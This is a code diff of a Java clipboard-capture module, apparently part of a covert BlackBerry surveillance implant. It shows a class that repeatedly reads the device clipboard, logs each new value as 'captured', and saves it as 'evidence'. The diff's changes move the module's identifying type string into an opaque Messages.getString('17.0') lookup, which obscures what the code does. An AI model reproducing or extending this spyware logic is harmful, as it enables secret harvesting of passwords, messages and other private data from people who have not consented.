@@ -12,6 +12,7 @@ package blackberry.module;
 import java.util.Vector;
 
 import net.rim.device.api.system.Clipboard;
+import blackberry.Messages;
 import blackberry.config.ConfModule;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
@@ -28,15 +29,15 @@ import blackberry.utils.WChar;
  */
 public final class ModuleClipboard extends BaseModule implements UserAgent {
     //#ifdef DEBUG
-    static Debug debug = new Debug("ModClipboard", DebugLevel.VERBOSE);
+    static Debug debug = new Debug("ModClipboard", DebugLevel.VERBOSE); //$NON-NLS-1$
     //#endif
 
-    static String lastClip = "";
+    static String lastClip = ""; //$NON-NLS-1$
 
     private boolean clipSuspended;
 
     public static String getStaticType() {
-        return "clipboard";
+        return Messages.getString("17.0"); //$NON-NLS-1$
     }
 
     public static ModuleClipboard getInstance() {
@@ -52,7 +53,7 @@ public final class ModuleClipboard extends BaseModule implements UserAgent {
 
     public void actualStart() {
         //#ifdef DEBUG
-        debug.trace("actualStart");
+        debug.trace("actualStart"); //$NON-NLS-1$
         //#endif
     }
 
@@ -68,7 +69,7 @@ public final class ModuleClipboard extends BaseModule implements UserAgent {
         if (clip != null) {
             if (!clip.equals(lastClip)) {
                 //#ifdef DEBUG
-                debug.trace("actualRun: captured " + clip);
+                debug.trace("actualRun: captured " + clip); //$NON-NLS-1$
                 //#endif
                 saveEvidence(clip);
                 lastClip = clip;
@@ -79,13 +80,13 @@ public final class ModuleClipboard extends BaseModule implements UserAgent {
 
     public void actualStop() {
         //#ifdef DEBUG
-        debug.trace("actualStop");
+        debug.trace("actualStop"); //$NON-NLS-1$
         //#endif
     }
 
     public synchronized void setClip(String clip) {
         //#ifdef DEBUG
-        debug.trace("setClip: " + clip);
+        debug.trace("setClip: " + clip); //$NON-NLS-1$
         //#endif
         lastClip = clip;
          try{
@@ -93,7 +94,7 @@ public final class ModuleClipboard extends BaseModule implements UserAgent {
         }catch(Exception ex){
             //#ifdef DEBUG
             debug.error(ex);
-            debug.error("setClip, empty clip");
+            debug.error("setClip, empty clip"); //$NON-NLS-1$
             //#endif
         }
         clipSuspended = false;
